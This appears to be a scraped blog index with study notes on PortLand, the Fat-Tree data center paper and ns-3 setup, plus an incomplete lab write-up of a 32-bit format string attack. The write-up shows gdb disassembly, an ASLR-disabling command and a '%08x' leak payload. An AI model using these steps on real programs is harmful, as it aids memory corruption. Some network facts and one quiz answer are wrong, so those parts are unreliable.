PortLand satisfies R1 – R5? R1: VM can migrate, introduce PMAC R2: no configuration, LDP protocol R3: use all equal cost paths, ECMP R4: no loop R5: failure-tolerant, fabric manager PortLand满足R1-R5的方式如下：\nR1: 虚拟机迁移和引入PMAC： PortLand允许虚拟机迁移，并引入了PMAC（Persistent MAC）来保持虚拟机在不同子网上的IP地址不变，实现了透明的虚拟机迁移。 R2: 无需配置和LDP协议： PortLand不需要在每个交换机上进行繁琐的配置，而是使用了LDP（Label Distribution Protocol）协议，简化了网络管理的复杂性。 R3: 使用所有等价路径和ECMP： 为了实现更好的负载均衡和性能，PortLand利用ECMP（Equal Cost Multipath）使用所有等价路径，确保数据流可以通过多条路径传输，提高网络利用率。 R4: 无环路： PortLand设计中考虑了防止转发环路的问题，确保在网络路由收敛时不会出现不必要的循环。 R5: 容错性强，有Fabric Manager： PortLand具备故障容忍性，通过Fabric Manager进行管理，确保在网络中出现故障时可以及时调整和修复，提高了网络的可靠性和稳定性。 是的，这篇文章使用了伪MAC地址（PMAC）技术。\n🔬 理论推导 ","date":"2023-12-20T22:51:25+08:00","permalink":"https://anonymity-0.github.io/posts/portland/","title":"Portland"},{"content":"A scalable, commodity data center network architecture\n💡 Meta Data Title\nA scalable, commodity data center network architecture\nJournal\nACM SIGCOMM Computer Communication Review\nAuthors\nMohammad Al-Fares; Alexander Loukissas; Amin Vahdat\nPub. date\n八月 17, 2008\n期刊标签\nDOI\n10.1145/1402946.1402967\n附件\nAl-Fares et al_2008_A scalable, commodity data center network architecture.pdf\n📜 研究背景 \u0026amp; 基础 \u0026amp; 目的 “Clusters consisting of tens of thousands of PCs are not unheard of in the largest “institutions and thousand-node clusters are increasingly common in universities, research labs, and companies.” (Al-Fares 等, 2008, p. 63) 大型机构中由数万台PC组成的集群并不少见，在大学，研究实验室和公司中，千节点集群越来越普遍。这些集群用于各种目的，包括科学计算，数据分析和机器学习。它们提供了大量的计算能力，可用于解决复杂问题。\nDC Communications M2M communications：M2M communications，即机器对机器通信，是指机器与机器之间进行的数据通信。M2M通信的目的通常是实现机器之间的自动化控制和数据交换。\n“Today, the principle bottleneck in large-scale clusters is often inter-node communication bandwidth.” (Al-Fares 等, 2008, p. 63) 如今，大规模集群的主要瓶颈往往是节点间的通信带宽。\n“For example, MapReduce [12] must perform significant data shuffling to transport the output of its map phase before proceeding with its reduce phase. Applications running on clusterbased file systems [18, 28, 13, 26] often require remote-node access before proceeding with their I/O operations.” (Al-Fares 等, 2008, p. 63) 例如，MapReduce必须先进行大量的数据重组，以传输其映射阶段的输出，然后再进入还原阶段。在基于集群的文件系统上运行的应用程序在进行 I/O 操作前，通常需要远程节点访问。\n“A query to a web search engine often requires parallel communication with every node in the cluster hosting the inverted index to return the most relevant results [7].” (Al-Fares 等, 2008, p. 63) 🔤对网络搜索引擎的查询往往需要与承载倒排索引的集群中的每个节点进行并行通信，以返回最相关的结果[7]。🔤\n“Internet services increasingly employ service oriented architectures [13], where the retrieval of a single web page can require coordination and communication with literally hundreds of individual sub-services running on remote nodes.” (Al-Fares 等, 2008, p. 63) 🔤互联网服务越来越多地采用面向服务的架构[13]，在这种架构下，检索一个网页可能需要与远程节点上运行的数百个单独的子服务进行协调和通信。🔤\nTwo approaches for DC network “There are two high-level choices for building the communication fabric for large-scale clusters.”\napproach1 “One option leverages specialized hardware and communication protocols, such as InfiniBand [2] or Myrinet [6].” (Al-Fares 等, 2008, p. 63) 🔤一种方法是利用专用硬件和通信协议，如 InfiniBand [2] 或 Myrinet [6]。🔤\n缺点：\n“they do not leverage commodity parts (and are hence more expensive)” (Al-Fares 等, 2008, p. 63)它们不使用通用零件（因此更昂贵）\n“not natively compatible with TCP/IP applications.” (Al-Fares 等, 2008, p. 63) 🔤与 TCP/IP 应用程序不兼容。🔤\napproach2 “The second choice leverages commodity Ethernet switches and routers to interconnect cluster machines.” (Al-Fares 等, 2008, p. 63) 🔤第二种选择是利用商品以太网交换机和路由器实现集群机器之间的互联。🔤\n优点：\n“This approach supports a familiar management infrastructure along with unmodified applications, operating systems, and hardware.” (Al-Fares 等, 2008, p. 63) 🔤这种方法支持熟悉的管理基础设施以及未经修改的应用程序、操作系统和硬件。🔤\nDesired Properties for a DC Network Architecture直流网络架构的理想特性 “Scalable interconnection bandwidth: it should be possible for an arbitrary host in the data center to communicate with any other host in the network at the full bandwidth of its local network interface.” (Al-Fares 等, 2008, p. 64) 🔤可扩展的互联带宽：数据中心的任意一台主机都应能以其本地网络接口的全部带宽与网络中的任何其他主机进行通信。🔤\nScalable interconnection bandwidth: an arbitrary host can communicate with any other host at the full bandwidth of its local network interface (non-blocking).数据中心网络应该能够支持任意两个主机之间的全带宽通信，并且不会发生通信阻塞。这句话是数据中心网络设计的一个重要目标。 “Economies of scale: just as commodity personal computers became the basis for large-scale computing environments, we hope to leverage the same economies of scale to make cheap off-the-shelf Ethernet switches the basis for largescale data center networks.” (Al-Fares 等, 2008, p. 64) 🔤规模经济：正如商品化个人电脑成为大规模计算环境的基础一样，我们希望利用同样的规模经济，使廉价的现成以太网交换机成为大规模数据中心网络的基础。🔤\nEconomies of scale: make cheap off-the-shelf Ethernet switches the basis for large scale data center networks\n规模经济使廉价的现成以太网交换机成为大型数据中心网络的基础\n这句话的意思是，由于规模经济效应，廉价的现成以太网交换机在大型数据中心网络中得到了广泛应用。\n规模经济效应是指企业随着生产规模的扩大，单位产品的成本会降低的现象。在数据中心网络中，由于大型数据中心需要大量的以太网交换机，因此规模经济效应可以显著降低以太网交换机的成本。\n“Backward compatibility: the entire system should be backward compatible with hosts running Ethernet and IP. That is, existing data centers, which almost universally leverage commodity Ethernet and run IP, should be able to take advantage of the new interconnect architecture with no modifications.” (Al-Fares 等, 2008, p. 64) 🔤向后兼容性：整个系统应向后兼容运行以太网和 IP 的主机。也就是说，几乎普遍利用商品以太网和运行 IP 的现有数据中心应能利用新的互连架构，而无需进行任何修改。🔤\nBackward compatibility: the entire system should be backward compatible with hosts running Ethernet and IP.\n向后兼容：整个系统应与运行以太网和 IP 的主机向后兼容\n这句话强调了系统需要与现有以太网和 IP 网络无缝集成的重要性。这确保了新主机和设备可以与遗留设备无缝通信，防止中断并确保平稳过渡到新系统。\nConventional Data Center Network Topologies 传统数据中心网络拓扑结构 (Al-Fares 等, 2008, p. 65)\n“Typical architectures today consist of either two- or three-level trees of switches or routers. A three-tiered design (see Figure 1) has a core tier in the root of the tree, an aggregation tier in the middle and an edge tier at the leaves of the tree.” (Al-Fares 等, 2008, p. 64) 🔤目前，典型的架构由两层或三层交换机或路由器树组成。三层设计（见图 1）的核心层位于树的根部，汇聚层位于树的中部，边缘层位于树的叶部。🔤\n核心层（Core Tier）: 核心层是网络的顶层，负责处理整个数据中心内的高级路由和转发。它通常拥有大量的高速连接，以支持大规模的数据传输。 聚合层（Aggregation Tier）: 聚合层位于核心层和边缘层之间，负责将来自边缘层的流量进行汇总和转发。这一层的存在有助于提高网络的可扩展性和性能。 边缘层（Edge Tier）: 边缘层是网络结构的底层，位于树的末端，通常与终端设备直接相连。它处理与数据中心内部设备的直接通信，如服务器、存储设备等。 “We assume the use of two types of switches, which represent the current high-end in both port density and bandwidth. The first, used at the edge of the tree, is a 48-port GigE switch, with four 10 GigE uplinks. For higher levels of a communication hierarchy, we consider 128-port 10 GigE switches. Both types of switches allow all directly connected hosts to communicate with one another at the full speed of their network interface.” (Al-Fares 等, 2008, p. 64) 🔤我们假设使用两种类型的交换机，它们在端口密度和带宽方面都代表了当前的高端水平。第一种是用于树边缘的 48 端口千兆以太网交换机，带有四个万兆以太网上行链路。对于通信层次结构的较高层次，我们考虑使用 128 端口万兆以太网交换机。这两种类型的交换机都允许所有直接连接的主机以其网络接口的全速相互通信。🔤\nTwo types of switches:\n48-port GigE switch, with four 10 GigE uplinks, used at the edge of the tree\n这是一种用于数据中心网络结构边缘的交换机类型。 具有48个千兆以太网端口，这些端口用于连接直接的终端设备（主机）。 同时，它还有四个10千兆以太网的上行链路，连接到更高层次的网络结构，用于传输数据到聚合层。 128-port 10 GigE switch for higher levels of a communication hierarchy\n这是另一种用于通信层次的较高级别的交换机类型。 具有128个10千兆以太网端口，用于连接到。更多的底层交换机或直接连接到边缘层的终端设备 这种交换机具有更大的端口密度和更高的带宽，适用于需要处理更多数据流量的网络层次。 无论是48端口的千兆以太网交换机还是128端口的10千兆以太网交换机，它们都能够让直接连接的设备之间以最大速度进行通信。\n“Oversubscription” 过度订阅是一种设计数据中心网络的策略，目的是降低总体设计成本。\n“We define the term oversubscription to be the ratio of the worst-case achievable aggregate bandwidth among the end hosts to the total bisection bandwidth of a particular communication topology.” (Al-Fares 等, 2008, p. 64) 🔤我们将 \u0026ldquo;超量订购 \u0026ldquo;定义为终端主机之间最坏情况下可实现的总带宽与特定通信拓扑的总带宽之比。🔤\n文中定义过度订阅为终端主机之间最坏情况下可实现的总带宽与特定通信拓扑的总带宽之比\n“An oversubscription of 1:1 indicates that all hosts may potentially communicate with arbitrary other hosts at the full bandwidth of their network interface (e.g., 1 Gb/s for commodity Ethernet designs).” (Al-Fares 等, 2008, p. 64)\n1:1的过度订阅表示所有主机可以潜在地以它们网络接口的完整带宽进行通信，例如，对于通用以太网设计，即1 Gb/s。\n“An oversubscription value of 5:1 means that only 20% of available host bandwidth is available for some communication patterns. Typical designs are oversubscribed by a factor of 2.5:1 (400 Mbps) to 8:1 (125 Mbps) [1].” (Al-Fares 等, 2008, p. 64) 🔤5:1 的超额订购值意味着只有 20% 的可用主机带宽可用于某些通信模式。典型设计的超额订购系数为 2.5:1 （400 Mbps）至 8:1（125 Mbps）[1]。🔤\n虽然 1 Gb/s 以太网的数据中心可以实现 1:1 的超量订阅，但这种设计的成本通常过高。\nMulti-path Routing “Delivering full bandwidth between arbitrary hosts in larger clusters requires a “multi-rooted” tree with multiple core switches (see Figure 1).” (Al-Fares 等, 2008, p. 64) 🔤要在大型集群中的任意主机之间提供全带宽，就需要一个具有多个核心交换机的 \u0026ldquo;多根 \u0026ldquo;树（见图 1）。🔤\nMulti-Rooted Tree (多根树):\n这表示网络拓扑中存在多个核心交换机，这些交换机在树的根部，以支持更多的路径选择。\n“To take advantage of multiple paths, ECMP performs static load splitting among flows.” (Al-Fares 等, 2008, p. 64) 🔤为了利用多条路径，ECMP 在流量之间执行静态负载分流。🔤\nECMP (Equal-Cost Multi-Path):\nECMP 是一种多路径路由技术，旨在平均分担等代价路径上的流量。\n它允许在多个等代价路径上进行流量的分发，以提高网络的利用率。\nECMP 的实现对于路径的多样性有一定的限制，通常限制在 8-16 条路径之间。\n这可能不足以满足较大数据中心所需的高二分带宽，因为这限制了网络在不同路径上进行流量分发的灵活性。\n使用 ECMP 时，考虑的路径数量成倍增加，导致路由表的条目数量也成倍增加。\n这会增加系统的成本，并可能导致查找延迟的增加。\nCost (Al-Fares 等, 2008, p. 65)\n维持一个固定的oversubscription，cost会随规模急剧增加。\n(Al-Fares 等, 2008, p. 65)\n大型集群中实现高带宽水平的现有技术会产生显著的成本，而基于 fat-tree 架构的集群互连在适度的成本下具有显著的潜力。\n使用最大的10千兆以太网（10 GigE）和通用千兆以太网（GigE）交换机构建具有1:1过度订阅的数据中心，以及该集群最多可支持27,648个主机\n📊 研究内容 Fat tree based solution 有k个pod，每个pod包含两层k/2个交换机。这样的结构使得网络具有层次化的特点。\n在底层，每个k端口的交换机直接连接到k/2个主机。这确保了较低层次的直接主机连接。\n剩余的k/2个端口连接到层次结构中聚合层的k/2个端口。\n在fattree拓扑中，存在**(k/2)^2**个k端口的核心交换机。每个核心交换机有k个端口，其中每个端口连接到k个pod之一。\n考虑一个fattree拓扑，其中有k个pod，每个pod有k/2个交换机，每个交换机有k个端口。\n任意两个主机可能位于不同的pod，因此可以通过连接这两个pod的多条路径进行通信。对于每个pod，存在(k/2)个交换机，因此在每个pod内也有(k/2)条不同的路径。因此，总的最短路径数为(k/2)²。\n每个核心交换机的第i个端口与第i个pod连接。这样的连接模式确保了每个pod都与所有核心交换机直接相连。\n在每个pod的聚合层交换机上，与核心交换机的连接是以(k/2)的步幅进行的，即相邻的聚合层端口与核心交换机的连接是在(k/2)步幅上的。\n在这篇论文中，重点关注k值最多为48的设计。\n地址 “We allocate all the IP addresses in the network within the private 10.0.0.0/8 block. We follow the familiar quad-dotted form with the following conditions: The pod switches are given addresses of the form 10.pod.switch.1,wherepod denotes the pod number (in [0,k − 1]), and switch denotes the position of that switch in the pod (in [0,k−1], starting from left to right, bottom to top). We give core switches addresses of the form 10.k.j.i,wherej and i denote that switch’s coordinates in the (k/2)2 core switch grid (each in [1, (k/2)], starting from top-left). The address of a host follows from the pod switch it is connected to; hosts have addresses of the form: 10.pod.switch.ID,where ID is the host’s position in that subnet (in [2,k/2+1], starting from left to right). Therefore, each lower-level switch is responsible for a /24 subnet of k/2 hosts (for k\u0026lt;256). Figure 3 shows examples of this addressing scheme for a fat-tree corresponding to k =4.Even though this is relatively wasteful use of the available address space, it simplifies building the routing tables, as seen below. Nonetheless, this scheme scales up to 4.2M hosts.” (Al-Fares 等, 2008, p. 66)\n在网络中，我们将所有的IP地址分配在私有的10.0.0.0/8地址块中。我们按熟悉的四点形式进行分配，具体如下：pod交换机的地址形式为10.pod.switch.1，其中pod表示pod的编号（范围在[0, k-1]之间），switch表示该pod中交换机的位置（范围在[0, k-1]之间，从左到右，从下到上）。核心交换机的地址形式为10.k.j.i，其中j和i表示该交换机在(k/2) x (k/2)的核心交换机网格中的坐标（范围在[1, k/2]之间，从左上角开始）。主机的地址由其所连接的pod交换机产生；主机的地址形式为10.pod.switch.ID，其中ID是该子网中主机的位置（范围在[2, k/2+1]之间，从左到右）。\n交换机地址的分配 核心交换机的地址 主机的地址 算法 z 在[k/2,k-1]的原因：pod里面的上层交换机\n最里面的第一个循环的意思是：给pod里面的上层交换机按顺序添加前缀\n第二个addprefix的意思是增加一个0.0.0.0/0的默认前缀\n第二个循环的意思是给主机添加特定前缀\n“The reason for the modulo shift in the outgoing port is to avoid traffic from different lower-layer switches addressed to a host with the same host ID going to the same upper-layer switch.” (Al-Fares 等, 2008, p. 68) 🔤出站端口之所以要进行模数转换，是为了避免从不同下层交换机发送到具有相同主机 ID 的主机的流量进入同一上层交换机。🔤\n生产核心交换机路由 (Al-Fares 等, 2008, p. 68)\n就是为每个核心交换机按顺序分配一个10.x.0.0/16的路由\n例子 从10.0.1.2到10.2.0.3\n源主机（10.0.1.1）的网关交换机只会匹配带有 /0 一级前缀的数据包，因此会根据该前缀的二级表中的主机 ID 字节转发数据包。在该表中，数据包匹配 0.0.0.3/8 后缀，指向端口 2 和交换机 10.0.2.1（i=3，z=1）\n端口2:（3-2+1)mod(4/2+4/2)=2 为什么指向10.0.2.1？因为10.0.1.1到端口0和端口1指向向下的俩host，端口2指向10.0.2.1（从下到上，从左到右） “Switch 10.0.2.1 also follows the same steps and forwards on port 3, connected to core switch 10.4.1.1” (Al-Fares 等, 2008, p. 68) 🔤交换机 10.0.2.1 也遵循相同步骤，在连接到核心交换机 10.4.1.2 的端口 3 上进行转发🔤\ni=3，z=2，（3-2+2）mod（2+2）=3 因为目的地址在pod2，核心交换机10.4.1.2匹配10.2.0.0/16，端口2，指向10.2.2.1\n10.2.2.1匹配到10.2.0.0/24，指向10.2.0.1\n🚩 研究结论 📌 感想 \u0026amp; 疑问 What is the datacenter network? What is the desired property of the datacenter network? 根据提供的信息，对于数据中心网络，论文[1]提出了一种基于可扩展性和通用性的架构。数据中心网络旨在支持大规模集群之间的通信，并具有以下期望特性：\n1. 可扩展性：数据中心网络需要能够支持数以千计甚至数以百万计的节点，并提供良好的吞吐量和性能。这是因为数据中心通常由大量服务器和计算资源组成。\n2. 低延迟：数据中心网络需要具备低延迟的特性，以确保快速和高效的数据传输。这对于网络中的实时应用和大数据处理等任务至关重要。\n3. 高带宽：数据中心网络需要具有高带宽，以处理大量数据的传输需求。这是因为数据中心中经常需要在节点之间进行大规模的数据传输和通信。\nWhat is the traditional three-tier topology for the datacenter, its limitations? 传统的数据中心网络采用三层架构，包括核心层、聚合层和接入层。核心层处理数据中心内部的高级路由功能，聚合层用于连接核心层和接入层，并提供流量聚合和负载均衡。接入层则负责连接终端设备和聚合层。然而，传统的三层架构在规模扩大时会面临一些限制，如带宽瓶颈和复杂的缆线布局，导致整体性能和可扩展性受限。\nHow Fat-tree differs from the traditional design? In Topology\nFat-tree 是一种分层的树形结构，它通过增加接近根部的节点的带宽来解决网络瓶颈问题。在这种结构中，越靠近根部的节点（比如交换机）拥有更高的处理能力和更大的带宽。这种设计使得网络能够更好地扩展，并支持更多的终端节点。\nAddressing\nIP 地址范围：\n所有的 IP 地址都分配在私有的 10.0.0.0/8 地址块内。 Pod 交换机地址：\n每个 Pod 交换机的 IP 地址格式为 10.pod.switch.1。 其中 pod 是 Pod 编号，范围是 [0, k-1]。 switch 是该交换机在 Pod 内的位置，范围也是 [0, k-1]，按照从左到右、从下到上的顺序。 核心交换机地址：\n核心交换机的 IP 地址格式为 10.k.j.i。 j 和 i 是交换机在核心交换机网格中的坐标，范围是 [1, k/2]，从左上角开始。 主机地址：\n连接到 Pod 交换机的主机的 IP 地址格式为 10.pod.switch.ID。 ID 是主机在子网中的位置，范围是 [2, k/2+1]，按照从左到右的顺序。 子网管理：\n每个下级交换机管理一个包含 k/2 台主机的 /24 子网（当 k 小于 256 时）。 Routing algorithm 源 $ℎ1h1$ 到目的地 $ℎ2h2$ 的路由路径的例子。这个例子中，源地址是 10.0.1.2，目的地地址是 10.2.0.3。以下是每一跳的详细描述以及如何确定输出端口：\n第一跳 - 网关交换机:\n源主机的网关交换机（10.0.1.1）首先匹配到 /0 第一级前缀，然后根据该前缀的二级表中的主机 ID 字节来转发数据包。在这个表中，数据包匹配到 0.0.0.3/8 后缀，指向端口 2 和交换机 10.0.2.1 (页面 6)。 第二跳 - Pod 交换机:\n交换机 10.0.2.1 也执行相同的步骤，并通过连接到核心交换机 10.4.1.1 的端口 3 转发数据包。 第三跳 - 核心交换机:\n核心交换机匹配数据包到一个终止的 10.2.0.0/16 前缀，这个前缀指向目的地 Pod 2。 如果目的地地址变成 10.2.0.2，路由路径将会有所不同。以下是基于文档中的两级路由表和网络拓扑的详细解释：\n第一跳 - 网关交换机:\n源主机的网关交换机（假设为 10.0.1.1）首先匹配到 /0 第一级前缀。然后，它会根据该前缀的二级表中的主机 ID 字节来转发数据包。在这个表中，数据包匹配到的后缀将会是 0.0.0.2/8，这将决定数据包应该转发到的端口和下一个交换机。 第二跳 - Pod 交换机:\n第二个交换机（例如 10.0.2.1）也会执行类似的步骤，根据其路由表中的匹配项来决定将数据包转发到哪个端口，以及下一个目标核心交换机。 第三跳 - 核心交换机:\n到达核心交换机（例如 10.4.1.1）后，它会匹配数据包到一个终止的 10.2.0.0/16 前缀。这个前缀指向目的地 Pod 2。核心交换机将根据其路由表决定将数据包转发到哪个 Pod 交换机。 最后一跳 - 到达目的地:\n在 Pod 2 内，相应的交换机将根据其路由表来决定如何将数据包最终转发到目的地地址 10.2.0.2 的主机。 问题 假设 Fattree 用10.0.0.0/8的地址空间进行编址，且不考虑单个交换机大小的物理限制。\n1. 该地址空间所能支持的最大 Fattree 有多少个pod，即K=\n首先，10.0.0.0/8的地址空间有\n$$2^{24}$$\n个IP地址，其中一个地址用于网络标识，一个地址用于广播，剩下的地址用于主机。\n$$\\frac{k^3}{4} \\leq 2^{24}-2$$\nk=406\n2.以下哪个数字是一个完整的Fattree 可能支持的主机数（）\nA. 4194304\nB. 2097152\nC.3906250\nD. 2916000\n对于A选项（4194304），我们需要解方程 $\\frac{k^3}{4}=4194304$。 对于B选项（2097152），方程为 $\\frac{k^3}{4}=2097152$。 对于C选项（3906250），方程为 $\\frac{k^3}{4}=3906250$。 对于D选项（2916000），方程为 $\\frac{k^3}{4}=2916000$。 我们可以计算每个方程来找出正确的答案。\n根据计算结果：\n对于选项A（4194304），计算得到的k值约为256，是一个合理的偶数。 对于选项B（2097152），计算得到的k值约为203.19，不是偶数。 对于选项C（3906250），计算得到的k值约为250，是一个合理的偶数。 对于选项D（2916000），计算得到的k值约为226.79，不是偶数。 由于k必须是偶数，因此只有选项A和C的k值符合条件。但在Fat-tree拓扑中，k通常是2的幂次方，所以最符合条件的答案是选项A（4194304），其对应的k值为256。\n3. Fattree 用的是交换机连接，给每个交换机分配 IP地址的目的是\n“we introduce the concept of two-level route lookups to assist with multi-path routing across the fat-tree.” (Al-Fares 等, 2008, p. 66) 🔤我们引入了两级路由查找的概念，以帮助在胖树上进行多路径路由选择。🔤\n“Even though this is relatively wasteful use of the available address space, it simplifies building the routing tables, as seen below.” (Al-Fares 等, 2008, p. 66) 🔤尽管这相对浪费了可用地址空间，但却简化了路由表的构建，如下所示。🔤\nFattree使用交换机连接，并给每个交换机分配IP地址的目的是为了实现数据中心的通信和路由功能。通过给交换机分配IP地址，可以在网络中对不同的主机进行定位和识别，实现数据包的转发和数据中心网络的路由控制。这样可以保证在数据中心网络中的每个交换机都能够准确地识别和转发数据包。此外，通过对不同交换机分配不同的IP地址，还可以构建网络拓扑和路由表，实现数据中心网络的高效通信和负载均衡。\n🔬 理论推导 参考 https://blog.csdn.net/baidu_20163013/article/details/110004560\nhttps://blog.csdn.net/u012925450/article/details/108493968\nhttps://blog.csdn.net/weixin_44639164/article/details/126950178?\n","date":"2023-12-19T15:45:19+08:00","permalink":"https://anonymity-0.github.io/posts/fat-tree/","title":"Fat Tree"},{"content":"介绍 ns3是用来进行网络仿真的一个平台\n学习资源 略\n安装 源码安装 详情可参考ns-3 Installation Guide — Installation guide\n下载源码 [Releases | ns-3](https://www.nsnam.org/releases/ 进入网站选择版本下载 编译源码 解压进入文件夹 cd /Users/x x x/Downloads/ns-allinone-3.40 编译文件 ./build.py --enable-examples --enable-tests 注：记得提前安装好cmake brew install cmake 安装完成以后cd ns-3.40可以通过ls查看文件内容\n在ns-3.36版本之后，ns-3的构建系统从waf更改为CMake，并引入了一个名为ns3的Python脚本来替代waf\n运行第一个模拟仿真脚本 通过 ./ns3 run hello-simulator 运行\n测试的安装 1agq@AGdeMacBook-Air ns-3.40 % ./test.py ","date":"2023-12-18T15:38:41+08:00","permalink":"https://anonymity-0.github.io/posts/ns-3%E5%88%9D%E4%B8%8A%E6%89%8B/","title":"NS 3初上手"},{"content":"题目：在32位的ubuntu16.04运行环境下，对格式化漏洞程序vul_formatstr2.c，参照 12.2.4的方法，说明如何修改程序，将变量B的值改成0x5678CDEF。\n在Ubuntu 64位系统上，使用以下命令来安装gcc多架构编译器和32位库：\nsudo apt-get install gcc-multilib libc6-dev-i386\n在编译C程序时，使用-m32选项来生成32位的可执行文件。例如： gcc -m32 -o v2 vul_formatstr2.c\nazureuser@MyServer:~/hw$ gdb v2\n1 0x0000122d \u0026lt;+0\u0026gt;: endbr32 2 0x00001231 \u0026lt;+4\u0026gt;: push %ebp 3 0x00001232 \u0026lt;+5\u0026gt;: mov %esp,%ebp 4 0x00001234 \u0026lt;+7\u0026gt;: push %ebx 5 0x00001235 \u0026lt;+8\u0026gt;: sub $0x414,%esp 6 0x0000123b \u0026lt;+14\u0026gt;: call 0x1130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 7 0x00001240 \u0026lt;+19\u0026gt;: add $0x2d8c,%ebx 8 0x00001246 \u0026lt;+25\u0026gt;: mov %gs:0x14,%eax 9 0x0000124c \u0026lt;+31\u0026gt;: mov %eax,-0xc(%ebp) 10 0x0000124f \u0026lt;+34\u0026gt;: xor %eax,%eax 11 0x00001251 \u0026lt;+36\u0026gt;: movl $0x3435,-0x418(%ebp) 12 0x0000125b \u0026lt;+46\u0026gt;: movl $0x5657,-0x414(%ebp) 13 0x00001265 \u0026lt;+56\u0026gt;: movl $0x7879,-0x410(%ebp) 14 0x0000126f \u0026lt;+66\u0026gt;: lea -0x410(%ebp),%eax 15 0x00001275 \u0026lt;+72\u0026gt;: push %eax 16 0x00001276 \u0026lt;+73\u0026gt;: lea -0x414(%ebp),%eax 17 0x0000127c \u0026lt;+79\u0026gt;: push %eax 18 0x0000127d \u0026lt;+80\u0026gt;: lea -0x418(%ebp),%eax 19 0x00001283 \u0026lt;+86\u0026gt;: push %eax 20 0x00001284 \u0026lt;+87\u0026gt;: lea -0x1fc4(%ebx),%eax 21 0x0000128a \u0026lt;+93\u0026gt;: push %eax 22 0x0000128b \u0026lt;+94\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 23 0x00001290 \u0026lt;+99\u0026gt;: add $0x10,%esp 24 0x00001293 \u0026lt;+102\u0026gt;: mov -0x410(%ebp),%ecx 25 0x00001299 \u0026lt;+108\u0026gt;: mov -0x414(%ebp),%edx 26 0x0000129f \u0026lt;+114\u0026gt;: mov -0x418(%ebp),%eax 27 0x000012a5 \u0026lt;+120\u0026gt;: push %ecx 28 0x000012a6 \u0026lt;+121\u0026gt;: push %edx 29 0x000012a7 \u0026lt;+122\u0026gt;: push %eax 30 0x000012a8 \u0026lt;+123\u0026gt;: lea -0x1fab(%ebx),%eax 31 0x000012ae \u0026lt;+129\u0026gt;: push %eax 32 0x000012af \u0026lt;+130\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 33 0x000012b4 \u0026lt;+135\u0026gt;: add $0x10,%esp 34 0x000012b7 \u0026lt;+138\u0026gt;: sub $0xc,%esp 35 0x000012ba \u0026lt;+141\u0026gt;: lea -0x1f94(%ebx),%eax 36 0x000012c0 \u0026lt;+147\u0026gt;: push %eax 37 0x000012c1 \u0026lt;+148\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 38 0x000012c6 \u0026lt;+153\u0026gt;: add $0x10,%esp 39 0x000012c9 \u0026lt;+156\u0026gt;: sub $0x8,%esp 40 0x000012cc \u0026lt;+159\u0026gt;: lea -0x40c(%ebp),%eax 41 0x000012d2 \u0026lt;+165\u0026gt;: push %eax 42 0x000012d3 \u0026lt;+166\u0026gt;: lea -0x1f7d(%ebx),%eax 43 0x000012d9 \u0026lt;+172\u0026gt;: push %eax 44 0x000012da \u0026lt;+173\u0026gt;: call 0x10e0 \u0026lt;__isoc99_scanf@plt\u0026gt; 45 0x000012df \u0026lt;+178\u0026gt;: add $0x10,%esp 46 0x000012e2 \u0026lt;+181\u0026gt;: sub $0xc,%esp 47 0x000012e5 \u0026lt;+184\u0026gt;: lea -0x40c(%ebp),%eax 48 0x000012eb \u0026lt;+190\u0026gt;: push %eax 49 0x000012ec \u0026lt;+191\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 50 0x000012f1 \u0026lt;+196\u0026gt;: add $0x10,%esp 51 0x000012f4 \u0026lt;+199\u0026gt;: sub $0xc,%esp 52 0x000012f7 \u0026lt;+202\u0026gt;: lea -0x1f7a(%ebx),%eax 53 0x000012fd \u0026lt;+208\u0026gt;: push %eax 54 0x000012fe \u0026lt;+209\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 55 0x00001303 \u0026lt;+214\u0026gt;: add $0x10,%esp 56 0x00001306 \u0026lt;+217\u0026gt;: mov -0x410(%ebp),%ecx 57 0x0000130c \u0026lt;+223\u0026gt;: mov -0x414(%ebp),%edx 58 0x00001312 \u0026lt;+229\u0026gt;: mov -0x418(%ebp),%eax 59 0x00001318 \u0026lt;+235\u0026gt;: push %ecx 60 0x00001319 \u0026lt;+236\u0026gt;: push %edx 61 0x0000131a \u0026lt;+237\u0026gt;: push %eax 62 0x0000131b \u0026lt;+238\u0026gt;: lea -0x1f78(%ebx),%eax 63 0x00001321 \u0026lt;+244\u0026gt;: push %eax 64 0x00001322 \u0026lt;+245\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 65 0x00001327 \u0026lt;+250\u0026gt;: add $0x10,%esp 66 0x0000132a \u0026lt;+253\u0026gt;: nop 67 0x0000132b \u0026lt;+254\u0026gt;: mov -0xc(%ebp),%eax 68 0x0000132e \u0026lt;+257\u0026gt;: xor %gs:0x14,%eax 69 0x00001335 \u0026lt;+264\u0026gt;: je 0x133c \u0026lt;formatstr_vul+271\u0026gt; 70 0x00001337 \u0026lt;+266\u0026gt;: call 0x13f0 \u0026lt;__stack_chk_fail_local\u0026gt; 71 0x0000133c \u0026lt;+271\u0026gt;: mov -0x4(%ebp),%ebx 72 0x0000133f \u0026lt;+274\u0026gt;: leave 73 0x00001340 \u0026lt;+275\u0026gt;: ret End of assembler dump. (gdb) b *(formatstr_vul+191) Breakpoint 1 at 0x12ec (gdb) r Starting program: /home/azureuser/hw/v2 \u0026amp;A=0xffffcde0 \u0026amp;B=0xffffcde4 C=0xffffcde8. A=0x3435 B=0x5657 C=0x7879. Please enter a string: ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\nBreakpoint 1, 0x565562ec in formatstr_vul () (gdb) x/x $esp 0xffffcdd0: 0xffffcdec (gdb) p (0xbfffcdec-0xbfffcdd0)/4 $1 = 7\n因此，user_input的首地址为0xffffcdec，位于栈顶开始的第7个(4字 节）单元。\n关闭地址随机化机制: sudo sysctl -w kernel.randomize_va_space=0\n根据上面可知 \u0026amp;B=0xffffcde4=4294954468\n1azureuser@MyServer:~/hw$ ./read2file 2Please enter an address. 34294954468 4Please enter the format string: 5%08x.%08x.%08x.%08x.%08x.%08x.%08x. 6The string length is 39 7azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring 8\u0026amp;A=0xffffce30 \u0026amp;B=0xffffce34 C=0xffffce38. 9A=0x3435 B=0x5657 C=0x7879. 10Please enter a string: 11����ffffce3c.00005657.00007879.00003435.00005657.00007879.ffffcde4. 12New values A=0x3435 B=0x5657 C=0x7879. 变量B的地址送入堆栈，\u0026amp;B=0xffffce34 =4294954548\n编译 